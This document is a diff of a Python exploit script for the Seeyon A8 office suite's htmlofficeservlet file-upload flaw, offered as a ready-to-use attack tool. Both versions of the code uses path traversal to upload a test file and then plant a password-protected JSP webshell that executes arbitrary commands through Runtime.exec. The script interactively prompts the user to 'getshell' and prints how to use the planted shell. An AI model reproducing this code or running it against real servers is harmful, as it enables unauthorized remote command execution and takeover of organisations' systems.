@@ -1,35 +1,66 @@
-import time
 import requests
+import time
 
+header = {
 
-info = {
-    "name": "致远 A8 可 getshell",
-    "author": "reber",
-    "version": "致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1",
-    "type": "file_upload",
-    "level": "high",
-    "result": "",
-    "status": False,
-    "references": "",
-    "desc": "<vul describtion>",
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
+
 }
-arg = ""
+url = input("input your want to test the url:")
+post_url = url + '/seeyon/htmlofficeservlet'
 
-headers = {
-        "Pragma": "no-cache",
-        "Cache-Control": "no-cache",
-        "Upgrade-Insecure-Requests": "1",
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-        "Accept-Language": "zh-CN,zh;q=0.9",
-        "Connection": "close",
-        "Content-Length": "429",
-    }
 
-def assign(service, arg):
-    if service == 'seeyon':
-        return True, arg
+def poc():
+    file = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\zhengbianlu.txt')
+    key_works = ''.join("zhengbianlu")
 
+    data = "DBSTEP V3.0     355             0               12             DBSTEP=OKMLlKlV\r\n"
+    data += "OPTION=S3WYOSWLBSGr\r\n"
+    data += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
+    data += "CREATEDATE=wUghPB3szB3Xwg66\r\n"
+    data += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
+    data += "originalFileId=wV66\r\n"
+    data += "originalCreateDate=wUghPB3szB3Xwg66\r\n"
+    data += "FILENAME={}\r\n".format(file)
+    data += "needReadFile=yRWZdAS6\r\n"
+    data += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
+    data += "a{}".format(key_works)
+
+    requests.post(url=post_url, data=data, headers=header)
+
+    upload_url = url +'/seeyon/zhengbianlu.txt'
+    time.sleep(2)
+    get_content = requests.get(url=upload_url)
+    code = get_content.status_code
+    content = get_content.text
+
+    if code == 200 and key_works[1:] in content:
+        print("this url exist the vuln and can getshell")
+        print("the test's url is {}".format(upload_url))
+    else:
+        print("no vuln")
+
+def exp():
+    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwerasdf.jsp')
+    exp_url = url + '/seeyon/htmlofficeservlet'
+
+    payload = """DBSTEP V3.0     355             0               888            DBSTEP=OKMLlKlV\r
+    OPTION=S3WYOSWLBSGr\r
+    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
+    CREATEDATE=wUghPB3szB3Xwg66\r
+    RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
+    originalFileId=wV66\r
+    originalCreateDate=wUghPB3szB3Xwg66\r
+    FILENAME=""" + file_name + """\r
+    needReadFile=yRWZdAS6\r
+    originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
+    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("zhengbianlu".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""
+
+    requests.post(url=exp_url, data=payload, headers=header)
+    get_content = requests.get(url+'/seeyon/qwerasdf.jsp?pwd=zhengbianlu&cmd=cmd+/c+echo+helloword')
+    if 'helloword' in get_content.text:
+        print("it was writed websehll and the path is {}".format(url+'/seeyon/qwerasdf.jsp?pwd=zhengbianlu&cmd=cmd+/c+echo+helloword'))
+        print("the useage: url/seeyon/qwerasdf.jsp?pwd=zhengbianlu&cmd=cmd+/c+cmd")
 
 def encode(origin_bytes):
     """
@@ -63,70 +94,21 @@ def encode(origin_bytes):
     return resp
 
 
-def verify(arg):
-    url = arg + "/seeyon/htmlofficeservlet"
-    tmp_random_str = ''.join("121212")
-
-    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\1.txt')
-    payload = "DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n"
-    payload += "OPTION=S3WYOSWLBSGr\r\n"
-    payload += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
-    payload += "CREATEDATE=wUghPB3szB3Xwg66\r\n"
-    payload += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
-    payload += "originalFileId=wV66\r\n"
-    payload += "originalCreateDate=wUghPB3szB3Xwg66\r\n"
-    payload += "FILENAME={}\r\n".format(file_name)
-    payload += "needReadFile=yRWZdAS6\r\n"
-    payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
-    payload += "a{}".format(tmp_random_str)
-
-    try:
-        requests.post(url=url, data=payload, headers=headers)
-
-        upfile_url = arg + "/seeyon/1.txt"
-        time.sleep(2)
-        resp = requests.get(url=upfile_url)
-        code = resp.status_code
-        content = resp.text
-    except Exception as e:
-        # print str(e)
+res = requests.get(url=post_url, headers=header)
+keyword = 'DBSTEP V3.0     0               21              0               htmoffice operate err'
+if keyword in res.text:
+    poc()
+    print("")
+    print("Do you want to try to getshell?")
+    print("Yes or No")
+    an = input("")
+    if an.lower() == 'yes':
+        exp()
+    elif an.lower() == 'no':
         pass
     else:
-        if code == 200 and tmp_random_str[1:] in content:
-            info['status'] = True
-            info['result'] = "{} 可直接getshell, 测试文件路径: {}".format(arg, upfile_url)
+        an = print("please input the right answer:")
 
 
-def attack(arg):
-    url = arg + "/seeyon/htmlofficeservlet"
-    headers = {
-        "Pragma": "no-cache",
-        "Cache-Control": "no-cache",
-        "Upgrade-Insecure-Requests": "1",
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-        "Accept-Language": "zh-CN,zh;q=0.9",
-        "Connection": "close",
-        "Content-Length": "429",
-    }
-    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwer960452.jsp')
-    payload = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
-OPTION=S3WYOSWLBSGr\r
-currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
-CREATEDATE=wUghPB3szB3Xwg66\r
-RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
-originalFileId=wV66\r
-originalCreateDate=wUghPB3szB3Xwg66\r
-FILENAME=""" + file_name + """\r
-needReadFile=yRWZdAS6\r
-originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
-<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("el38A9485".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""
-
-    requests.post(url=url, data=payload, headers=headers)
-    resp = requests.get(arg + '/seeyon/qwer960452.jsp?pwd=el38A9485&cmd=cmd+/c+echo+ekwjkjrwre')
-    if 'ekwjkjrwre' in resp.text:
-        print(
-            "{} 的 webshell 路径: {}".format(arg, arg + '/seeyon/qwer960452.jsp?pwd=el38A9485&cmd=cmd+/c+whoami'))
-
-verify(arg)
-
+else:
+    print("this no vuln {}".format(url))
